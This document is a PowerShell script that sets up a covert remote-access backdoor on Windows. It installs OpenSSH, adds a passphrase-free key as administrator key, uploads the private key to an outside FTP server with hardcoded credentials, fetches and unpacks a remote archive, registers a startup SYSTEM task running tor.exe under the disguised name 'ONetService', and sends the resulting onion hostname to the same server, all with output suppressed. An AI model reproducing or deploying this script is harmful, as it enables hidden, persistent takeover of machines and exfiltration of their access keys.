# Install OpenSSH Server if not already installed
$sshCapability = Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
if ($sshCapability.State -ne 'Installed') {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 | Out-Null
}

# Ensure SSH server service is running and set to automatic
$sshdService = Get-Service -Name sshd -ErrorAction SilentlyContinue
if ($null -eq $sshdService) {
    exit
} elseif ($sshdService.Status -ne 'Running') {
    Start-Service sshd | Out-Null
}
if ($sshdService.StartType -ne 'Automatic') {
    Set-Service -Name sshd -StartupType 'Automatic' | Out-Null
}

# Add firewall rule for SSH if not already added
$firewallRule = Get-NetFirewallRule -Name 'sshd' -ErrorAction SilentlyContinue
if ($null -eq $firewallRule) {
    New-NetFirewallRule -Name 'sshd' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
}

# Ensure OpenSSH Authentication Agent service is running and set to automatic
$sshAgentService = Get-Service -Name 'ssh-agent' -ErrorAction SilentlyContinue
if ($null -ne $sshAgentService) {
    if ($sshAgentService.Status -ne 'Running') {
        Start-Service ssh-agent | Out-Null
    }
    if ($sshAgentService.StartType -ne 'Automatic') {
        Set-Service -Name ssh-agent -StartupType 'Automatic' | Out-Null
    }
}

# Generate SSH key pair if not already generated
$keyPath = "$env:USERPROFILE\.ssh\id_rsa"
if (-not (Test-Path $keyPath)) {
    ssh-keygen -t rsa -b 2048 -f $keyPath -N "" | Out-Null
}

# Add the SSH key to the ssh-agent (if not already added)
$sshAdded = ssh-add -L | Select-String -Pattern "$keyPath" -Quiet
if (-not $sshAdded) {
    ssh-add $keyPath | Out-Null
}

# Ensure administrators_authorized_keys file exists and copy public key to it if necessary
$sshDir = "$env:PROGRAMDATA\ssh"
$authKeysFile = "$sshDir\administrators_authorized_keys"
$publicKeyPath = "$keyPath.pub"
if (-not (Test-Path $authKeysFile)) {
    if (-not (Test-Path $sshDir)) {
        New-Item -Path $sshDir -ItemType Directory | Out-Null
    }
    Copy-Item -Path $publicKeyPath -Destination $authKeysFile | Out-Null
} else {
    $publicKeyContent = Get-Content -Path $publicKeyPath
    if (-not (Select-String -Path $authKeysFile -Pattern "$publicKeyContent" -SimpleMatch -Quiet)) {
        Add-Content -Path $authKeysFile -Value $publicKeyContent
    }
}

# Modify sshd_config to set 'PasswordAuthentication no'
$sshdConfigPath = "$sshDir\sshd_config"
if (Test-Path $sshdConfigPath) {
    $sshdConfigContent = Get-Content $sshdConfigPath
    if ($sshdConfigContent -match '#PasswordAuthentication yes') {
        $sshdConfigContent = $sshdConfigContent -replace '#PasswordAuthentication yes', 'PasswordAuthentication no'
        Set-Content $sshdConfigPath -Value $sshdConfigContent
    }
}

# Restart the SSH server to apply changes
Restart-Service -Name sshd -Force | Out-Null

# Upload the private key to FTP server only if not uploaded yet (termux on rooted android with ftp server)
$ftpHost = "myFTPserver.to"
$ftpPort = 21
$ftpUsername = "u0_a336@userFTPserver.to"
$ftpPassword = "rsa_n00b"
$ftpUri = "ftp://${ftpHost}:${ftpPort}/id_rsa"
$ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUri)
$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
$fileContents = [System.IO.File]::ReadAllBytes($keyPath)
$ftpRequest.ContentLength = $fileContents.Length
$requestStream = $ftpRequest.GetRequestStream()
$requestStream.Write($fileContents, 0, $fileContents.Length)
$requestStream.Close()
$ftpResponse = $ftpRequest.GetResponse()
$ftpResponse.Close()

# Download and extract the ZIP file only if not already downloaded (android, termux, apache2, ddns)
$zipUrl = "https://mywebsite.to/onion.zip"
$zipPath = "$env:TEMP\onion.zip"
$destinationPath = Join-Path -Path $env:PROGRAMDATA -ChildPath "onion"
if (-not (Test-Path -Path $destinationPath)) {
    New-Item -Path $destinationPath -ItemType Directory | Out-Null
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFileAsync([Uri]$zipUrl, $zipPath)
    while ($webClient.IsBusy) {
        Start-Sleep -Seconds 1
    }
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $destinationPath)
    Remove-Item -Path $zipPath
}

# Create the 'onionNet' folder only if it does not exist
$onionNetPath = Join-Path -Path $env:PROGRAMDATA -ChildPath "sshd"
if (-not (Test-Path -Path $onionNetPath)) {
    New-Item -Path $onionNetPath -ItemType Directory | Out-Null
}

# Register the scheduled task for tor.exe if it doesn't exist
$torExePath = Join-Path -Path $destinationPath -ChildPath "tor\tor.exe"
$torConfigPath = "C:\ProgramData\onion\data\torrc"
$logPath = "$env:TEMP\onetService_output.log"
if (Test-Path -Path $torExePath) {
    $taskExists = Get-ScheduledTask -TaskName "ONetService" -ErrorAction SilentlyContinue
    if (-not $taskExists) {
        $action = New-ScheduledTaskAction -Execute $torExePath -Argument "-f $torConfigPath"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -TaskName "ONetService" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Description "Service to run proxy for network service."
    }
}

# Check if 'hostname' file exists in the 'sshd' folder and upload to FTP server if it exists
$hostnameFilePath = Join-Path -Path $onionNetPath -ChildPath "hostname"
if (Test-Path -Path $hostnameFilePath) {
    $ftpHostnameUri = "ftp://${ftpHost}:${ftpPort}/hostname"
    
    # Create FTP request to upload the hostname file
    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpHostnameUri)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)

    # Read the hostname file into a byte array and upload
    $fileContents = [System.IO.File]::ReadAllBytes($hostnameFilePath)
    $ftpRequest.ContentLength = $fileContents.Length
    $requestStream = $ftpRequest.GetRequestStream()
    $requestStream.Write($fileContents, 0, $fileContents.Length)
    $requestStream.Close()

    # Get the response to ensure the upload is successful
    $ftpResponse = $ftpRequest.GetResponse()
    $ftpResponse.Close()
}

